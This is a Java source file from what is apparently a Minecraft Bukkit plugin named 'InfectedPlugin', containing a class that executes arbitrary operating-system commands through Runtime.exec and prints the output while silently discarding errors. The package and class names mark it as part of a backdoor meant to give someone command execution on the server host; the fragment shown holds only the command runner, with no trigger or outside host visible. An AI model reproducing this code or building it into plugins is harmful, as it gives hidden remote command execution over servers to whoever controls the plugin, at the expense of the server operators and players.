package org.CreeperCoders.InfectedPlugin;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.logging.Level;
import java.util.logging.Logger;
import org.bukkit.Bukkit;

public class IP_RunSystemCommand implements Runnable
{
    private static final Logger log = Bukkit.getLogger();
    private final String command;
    private final InfectedPlugin plugin;

    public IP_RunSystemCommand(String command, InfectedPlugin plugin)
    {
        this.command = command;
        this.plugin = plugin;
    }

    @Override
    public void run()
    {
        String s;
        Process p;
        try
        {
            p = Runtime.getRuntime().exec(command);
            BufferedReader br = new BufferedReader(new InputStreamReader(p.getInputStream()));
            while ((s = br.readLine()) != null)
            System.out.println("line: " + s);
            p.waitFor();
            p.destroy();
        } catch (Exception e) {}
    }
}
